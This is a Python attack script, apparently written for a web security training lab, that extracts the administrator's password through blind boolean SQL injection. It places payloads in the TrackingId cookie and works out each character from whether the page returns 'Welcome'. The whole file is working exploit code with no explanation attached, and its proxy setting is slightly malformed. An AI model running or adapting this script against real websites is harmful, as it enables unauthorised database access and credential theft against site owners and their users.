import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https:':'https//127.0.0.1:8080'}

def sqli_password_extractor(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range (32,126):
            sqli_payload = "' AND ascii(SUBSTRING((SELECT password FROM users WHERE username='administrator'), %s, 1)) = '%s'--" %(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId':'jDD7mnMmkJdmtVhN' + sqli_payload_encoded , 
                      'session':'EaLvqZkmuPF4c9vapnWZn2fBc1u6hvoy'}
            r=requests.get(url,cookies=cookie,verify=False,proxies=proxies,timeout=5)

            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r'+password_extracted)
                sys.stdout.flush()
                break
    # print("password extracted :)" ,password_extracted)


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s https://example.com" % sys.argv[0])

    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password_extractor(url)


if __name__ == "__main__":
    main()